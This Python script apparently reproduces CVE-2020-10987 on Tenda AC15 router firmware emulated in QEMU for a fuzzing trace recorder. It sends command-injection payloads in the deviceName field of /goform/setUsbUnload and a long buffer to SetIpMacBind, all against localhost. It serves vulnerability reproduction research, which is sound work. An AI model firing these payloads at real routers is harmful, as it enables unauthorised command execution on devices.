#!/usr/bin/env python3
"""
Record trace for Tenda AC15 - CVE-2020-10987
Command Injection in /goform/setUsbUnload endpoint
"""

import os
import sys
import subprocess
import time
import requests

# Configuration
QEMU_PATH = "/home/webfuzz/Documents/qemu/build/qemu-arm"
SIM_ROOT = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/images/TENDA_AC15/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root"
TARGET_BIN = "bin/httpd"
TRACE_FILE = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/crashes/real_world_repro/TENDA_AC15/traces/ac15_cmd_injection.trace"
HTTP_PORT = 8080

def start_httpd():
    """Start Tenda httpd in QEMU with trace recording"""
    print(f"[*] Starting Tenda AC15 httpd...")
    
    # Ensure trace directory exists
    os.makedirs(os.path.dirname(TRACE_FILE), exist_ok=True)
    
    env = os.environ.copy()
    env["RR_MODE"] = "RECORD"
    env["RR_TRACE_FILE"] = TRACE_FILE
    env["LD_LIBRARY_PATH"] = f"{SIM_ROOT}/lib:{SIM_ROOT}/usr/lib"
    
    # Kill existing instances
    subprocess.run(["pkill", "-f", "qemu-arm.*httpd"], stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    cmd = [
        QEMU_PATH,
        "-L", SIM_ROOT,
        "-E", f"LD_LIBRARY_PATH={SIM_ROOT}/lib:{SIM_ROOT}/usr/lib",

        f"{SIM_ROOT}/{TARGET_BIN}",
        # No arguments for GoAhead daemon usually, or just port if supported. 
        # But this is "httpd" which often needs no args and reads from config.
        # We will try running it without args first, relying on dummy files.
    ]
    
    print(f"[*] Command: {' '.join(cmd)}")
    
    try:
        proc = subprocess.Popen(
            cmd,
            env=env,
            cwd=SIM_ROOT,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for server startup
        time.sleep(3)
        
        if proc.poll() is not None:
            stdout, stderr = proc.communicate()
            print(f"[-] httpd exited early!")
            print(f"    stdout: {stdout.decode('utf-8', errors='ignore')[:200]}")
            print(f"    stderr: {stderr.decode('utf-8', errors='ignore')[:200]}")
            return None
        
        print(f"[+] httpd started (PID: {proc.pid})")
        return proc
        
    except Exception as e:
        print(f"[-] Error starting httpd: {e}")
        return None

def trigger_cve():
    """Trigger CVE-2020-10987 via /goform/setUsbUnload"""
    print(f"\n[*] Triggering CVE-2020-10987...")
    
    base_url = f"http://127.0.0.1:{HTTP_PORT}"
    
    # CVE-2020-10987: Command injection in deviceName parameter
    test_payloads = [
        # Normal request first
        {"deviceName": "test_device"},
        # Command injection attempts
        {"deviceName": "test;id;"},
        {"deviceName": "test;whoami;"},
        {"deviceName": "test$(id)"},
    ]
    
    for i, payload in enumerate(test_payloads, 1):
        print(f"\n[*] Payload {i}: {payload}")
        try:
            resp = requests.post(
                f"{base_url}/goform/setUsbUnload",
                data=payload,
                timeout=3
            )
            print(f"    Status: {resp.status_code}")
            print(f"    Response: {resp.text[:100]}")
        except requests.exceptions.Timeout:
            print(f"    TIMEOUT - possible hang/crash")
        except Exception as e:
            print(f"    Error: {e}")
        
        time.sleep(0.5)
    
    # Also try buffer overflow endpoint
    print(f"\n[*] Testing SetIpMacBind buffer overflow...")
    try:
        overflow_payload = {
            "list": "A" * 500
        }
        resp = requests.post(
            f"{base_url}/goform/SetIpMacBind",
            data=overflow_payload,
            timeout=3
        )
        print(f"    Status: {resp.status_code}")
    except Exception as e:
        print(f"    Error: {e}")

def record_trace():
    """Main recording function"""
    print("="*60)
    print("Tenda AC15 Trace Recording - CVE-2020-10987")
    print("="*60)
    
    proc = start_httpd()
    
    if proc is None:
        print("[-] Failed to start httpd")
        print("[*] Note: httpd may need specific environment or missing libraries")
        return False
    
    try:
        # Give server time to initialize
        time.sleep(2)
        
        # Trigger CVE
        trigger_cve()
        
        # Wait for trace to flush
        time.sleep(2)
        
        # Terminate server
        print("\n[*] Terminating httpd...")
        proc.terminate()
        proc.wait(timeout=5)
        
        # Check trace
        if os.path.exists(TRACE_FILE):
            size = os.path.getsize(TRACE_FILE)
            print(f"[+] Trace recorded: {TRACE_FILE} ({size} bytes)")
            
            bbl_file = TRACE_FILE.replace('.trace', '.trace.bbl')
            if os.path.exists(bbl_file):
                print(f"[+] BBL file: {bbl_file}")
            
            return True
        else:
            print(f"[-] Trace file not created")
            return False
            
    except Exception as e:
        print(f"[-] Error: {e}")
        if proc:
            proc.kill()
        return False
    finally:
        subprocess.run(["pkill", "-f", "qemu-arm.*httpd"], stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    success = record_trace()
    sys.exit(0 if success else 1)
